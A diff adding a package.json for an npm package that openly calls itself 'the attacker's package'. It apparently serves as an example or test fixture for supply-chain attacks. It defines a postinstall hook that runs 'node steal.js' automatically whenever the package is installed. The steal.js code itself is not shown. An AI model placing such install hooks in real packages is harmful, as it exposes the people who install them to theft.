@@ -1,0 +1,8 @@
+{
+  "name": "cute-little-helper",
+  "version": "1.0.3",
+  "description": "A totally innocent utility package (this is the attacker's package)",
+  "scripts": {
+    "postinstall": "node steal.js"
+  }
+}
